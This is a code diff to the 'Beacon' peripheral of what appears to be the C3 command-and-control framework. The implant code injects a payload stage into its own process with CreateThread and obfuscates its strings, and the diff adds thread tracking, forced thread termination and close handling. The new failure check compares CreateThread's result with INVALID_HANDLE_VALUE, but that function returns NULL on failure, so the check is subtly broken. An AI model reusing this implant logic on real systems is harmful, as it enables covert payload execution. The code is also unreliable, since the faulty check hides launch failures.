@@ -30,7 +30,7 @@ MWR::C3::Interfaces::Peripherals::Beacon::Beacon(ByteView arguments)
 	// use explicit type to bypass overload resolution
 	DWORD(WINAPI * sehWrapper)(SEH::CodePointer) = SEH::SehWrapper;
 	// Inject the payload stage into the current process.
-	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(sehWrapper), codePointer, 0, nullptr))
+	if (m_BeaconThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(sehWrapper), codePointer, 0, nullptr); m_BeaconThread == INVALID_HANDLE_VALUE)
 		throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
 
 	std::this_thread::sleep_for(std::chrono::milliseconds{ 30 }); // Give beacon thread time to start pipe.
@@ -54,11 +54,22 @@ MWR::C3::Interfaces::Peripherals::Beacon::Beacon(ByteView arguments)
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+MWR::C3::Interfaces::Peripherals::Beacon::~Beacon()
+{
+	// Check if thread already finished running and kill if otherwise
+	if (WaitForSingleObject(m_BeaconThread, 0) != WAIT_OBJECT_0)
+		TerminateThread(m_BeaconThread, 0);
+}
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 void MWR::C3::Interfaces::Peripherals::Beacon::OnCommandFromConnector(ByteView data)
 {
 	// Get access to write when whole reed is done.
 	std::unique_lock<std::mutex> lock{ m_Mutex };
-	m_ConditionalVariable.wait(lock, [this]() { return !m_ReadingState; });
+	m_ConditionalVariable.wait(lock, [this]() { return !m_ReadingState || m_Close; });
+
+	if (m_Close)
+		return;
 
 	// Write
 	m_Pipe->Write(data);
@@ -74,7 +85,10 @@ MWR::ByteVector MWR::C3::Interfaces::Peripherals::Beacon::OnReceiveFromPeriphera
 {
 	// Get Access to reed after normal write.
 	std::unique_lock<std::mutex> lock{ m_Mutex };
-	m_ConditionalVariable.wait(lock, [this]() { return m_ReadingState; });
+	m_ConditionalVariable.wait(lock, [this]() { return m_ReadingState || m_Close; });
+
+	if (m_Close)
+		return {};
 
 	// Read
 	auto ret = m_Pipe->Read();
@@ -135,6 +149,14 @@ MWR::ByteView MWR::C3::Interfaces::Peripherals::Beacon::GetCapability()
 	"commands": []
 }
 )";
+}
+
+void MWR::C3::Interfaces::Peripherals::Beacon::Close()
+{
+	MWR::C3::Device::Close();
+	std::scoped_lock lock(m_Mutex);
+	m_Close = true;
+	m_ConditionalVariable.notify_one();
 }
 
 // Custom payload is removed from release.
